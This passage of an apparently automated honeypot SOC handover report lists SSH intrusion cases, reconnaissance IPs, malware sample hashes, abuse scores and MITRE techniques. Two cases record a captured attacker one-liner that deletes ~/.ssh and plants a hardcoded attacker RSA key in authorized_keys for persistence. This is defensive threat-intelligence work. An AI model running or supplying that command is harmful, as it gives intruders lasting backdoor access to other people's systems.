| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 06:49:45` | `cowrie.session.connect` |
| `2026-05-11 06:49:45` | `cowrie.client.version` |
| `2026-05-11 06:49:45` | `cowrie.client.kex` |
| `2026-05-11 06:49:46` | `cowrie.login.success` |
| `2026-05-11 06:49:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.220.238[.]30` to AbuseIPDB if not already reported
- [ ] Block `114.220.238[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2fd5491d556

| Field | Detail |
|---|---|
| **Source IP** | `45.170.128[.]15` |
| **First Seen** | 2026-05-11 07:05 |
| **Last Seen** | 2026-05-11 07:05 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 07:05:01` | `cowrie.session.connect` |
| `2026-05-11 07:05:01` | `cowrie.client.version` |
| `2026-05-11 07:05:01` | `cowrie.client.kex` |
| `2026-05-11 07:05:03` | `cowrie.login.success` |
| `2026-05-11 07:05:04` | `cowrie.session.params` |
| `2026-05-11 07:05:04` | `cowrie.command.input` |
| `2026-05-11 07:05:04` | `cowrie.command.failed` |
| `2026-05-11 07:05:04` | `cowrie.log.closed` |
| `2026-05-11 07:05:05` | `cowrie.session.params` |
| `2026-05-11 07:05:05` | `cowrie.command.input` |
| `2026-05-11 07:05:05` | `cowrie.session.file_download` |
| `2026-05-11 07:05:05` | `cowrie.log.closed` |
| `2026-05-11 07:05:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.170.128[.]15` to AbuseIPDB if not already reported
- [ ] Block `45.170.128[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4a1a0e3b0de

| Field | Detail |
|---|---|
| **Source IP** | `45.170.128[.]15` |
| **First Seen** | 2026-05-11 07:05 |
| **Last Seen** | 2026-05-11 07:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 07:05:09` | `cowrie.session.connect` |
| `2026-05-11 07:05:09` | `cowrie.client.version` |
| `2026-05-11 07:05:09` | `cowrie.client.kex` |
| `2026-05-11 07:05:10` | `cowrie.login.success` |
| `2026-05-11 07:05:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.170.128[.]15` to AbuseIPDB if not already reported
- [ ] Block `45.170.128[.]15` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7969bad8415a

| Field | Detail |
|---|---|
| **Source IP** | `45.170.128[.]15` |
| **First Seen** | 2026-05-11 07:14 |
| **Last Seen** | 2026-05-11 07:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 07:14:15` | `cowrie.session.connect` |
| `2026-05-11 07:14:15` | `cowrie.client.version` |
| `2026-05-11 07:14:16` | `cowrie.client.kex` |
| `2026-05-11 07:14:17` | `cowrie.login.success` |
| `2026-05-11 07:14:18` | `cowrie.session.params` |
| `2026-05-11 07:14:18` | `cowrie.command.input` |
| `2026-05-11 07:14:18` | `cowrie.command.failed` |
| `2026-05-11 07:14:18` | `cowrie.log.closed` |
| `2026-05-11 07:14:19` | `cowrie.session.params` |
| `2026-05-11 07:14:19` | `cowrie.command.input` |
| `2026-05-11 07:14:19` | `cowrie.session.file_download` |
| `2026-05-11 07:14:19` | `cowrie.log.closed` |
| `2026-05-11 07:14:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.170.128[.]15` to AbuseIPDB if not already reported
- [ ] Block `45.170.128[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5067feefb023

| Field | Detail |
|---|---|
| **Source IP** | `45.170.128[.]15` |
| **First Seen** | 2026-05-11 07:14 |
| **Last Seen** | 2026-05-11 07:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 07:14:23` | `cowrie.session.connect` |
| `2026-05-11 07:14:23` | `cowrie.client.version` |
| `2026-05-11 07:14:23` | `cowrie.client.kex` |
| `2026-05-11 07:14:25` | `cowrie.login.success` |
| `2026-05-11 07:14:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.170.128[.]15` to AbuseIPDB if not already reported
- [ ] Block `45.170.128[.]15` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `104.155.82[.]150` | **96** | 2026-05-11 04:10 | 2026-05-11 05:26 | 10m | 12 | `T1110.001` | 🟠 MEDIUM |
| `114.220.238[.]30` | **30** | 2026-05-11 06:38 | 2026-05-11 06:56 | 37m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `165.154.227[.]158` | **30** | 2026-05-11 04:34 | 2026-05-11 05:08 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.170.128[.]15` | **30** | 2026-05-11 06:50 | 2026-05-11 07:24 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.143.231[.]24` | **29** | 2026-05-11 03:53 | 2026-05-11 04:20 | 0m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.118[.]145` | **22** | 2026-05-11 06:43 | 2026-05-11 07:17 | 35m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `27.128.240[.]75` | **16** | 2026-05-11 03:51 | 2026-05-11 04:04 | 10m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.1.107[.]92` | **15** | 2026-05-11 07:23 | 2026-05-11 07:26 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `20.123.146[.]93` | **7** | 2026-05-11 04:24 | 2026-05-11 04:47 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `20.123.146[.]95` | **7** | 2026-05-11 04:01 | 2026-05-11 04:48 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `68.178.205[.]128` | **7** | 2026-05-11 04:47 | 2026-05-11 04:50 | 3m | 0 | `T1592` | 🟢 LOW |
| `20.123.146[.]92` | **6** | 2026-05-11 04:23 | 2026-05-11 04:43 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `20.123.146[.]94` | **6** | 2026-05-11 04:30 | 2026-05-11 04:42 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `154.221.23[.]179` | **5** | 2026-05-11 03:51 | 2026-05-11 03:54 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `4.210.186[.]201` | **4** | 2026-05-11 04:25 | 2026-05-11 04:44 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `150.95.25[.]34` | **2** | 2026-05-11 05:01 | 2026-05-11 05:15 | 2m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]193` | **2** | 2026-05-11 06:59 | 2026-05-11 06:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `118.106.202[.]169` | 1 | 2026-05-11 04:55 | 2026-05-11 04:55 | 30s | 0 | `T1592` | 🟢 LOW |
| `119.96.81[.]99` | 1 | 2026-05-11 06:41 | 2026-05-11 06:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.51.60[.]134` | 1 | 2026-05-11 05:14 | 2026-05-11 05:15 | 31s | 0 | `T1592` | 🟢 LOW |
| `14.103.75[.]9` | 1 | 2026-05-11 06:41 | 2026-05-11 06:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `175.198.110[.]15` | 1 | 2026-05-11 05:35 | 2026-05-11 05:35 | 13s | 0 | `T1592` | 🟢 LOW |
| `212.73.148[.]2` | 1 | 2026-05-11 05:09 | 2026-05-11 05:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `212.73.148[.]21` | 1 | 2026-05-11 05:05 | 2026-05-11 05:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.209.82[.]184` | 1 | 2026-05-11 06:40 | 2026-05-11 06:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]190` | 1 | 2026-05-11 07:41 | 2026-05-11 07:41 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.240.236[.]109` | 1 | 2026-05-11 07:38 | 2026-05-11 07:39 | 10s | 0 | `T1592` | 🟢 LOW |
| `96.224.49[.]20` | 1 | 2026-05-11 06:36 | 2026-05-11 06:36 | 32s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `45.170.128[.]15` | PY | GIG@NET SOCIEDAD ANONIMA | **100** ⚠️ | 4 |
| `212.73.148[.]2` | SG | NL MODAT | **100** ⚠️ | 50 |
| `114.220.238[.]30` | CN | Chinanet Jiangsu Province Network | **100** ⚠️ | 50 |
| `66.132.172[.]190` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `14.103.75[.]9` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `175.198.110[.]15` | KR | Korea Telecom | **100** ⚠️ | 30 |
| `104.155.82[.]150` | BE | Google LLC | **100** ⚠️ | 1 |
| `165.154.227[.]158` | TW | Scloud Pte Ltd t/a Scloud Pte Ltd | **100** ⚠️ | 50 |
| `66.240.236[.]109` | US | CariNet, Inc. | **100** ⚠️ | 50 |
| `20.123.146[.]92` | NL | Microsoft Corporation | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 228 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 156 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 34 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 17 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 17 |

---

## 🔕 False Positive Summary (28 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 10 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 2 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 12 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 387 cases |
| Tool 34  | Credential Extractor        | ✅ 193 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 54 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 28 filtered (7.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 40 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 34 priority case(s) shown individually · 28 recon entry/entries in table (17 group(s) consolidating 314 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-11T07:49:15Z_
